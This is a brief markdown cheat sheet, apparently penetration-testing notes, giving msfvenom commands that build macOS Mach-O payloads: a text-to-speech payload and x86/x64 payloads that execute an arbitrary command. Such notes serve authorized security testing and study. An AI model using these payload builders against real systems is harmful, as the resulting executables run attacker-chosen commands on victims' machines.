# Exec Payloads

## Text-To-Speech OSX Exec Payload

`$ msfvenom -p osx/x64/say text=<message> -f macho -o speak-x64`

## Execute OSX Exec Payload

`$ msfvenom -p osx/x86/exec cmd=<command> -f macho -o exec-cmd-x86`

`$ msfvenom -p osx/x64/exec cmd=<command> -f macho -o exec-cmd-x64`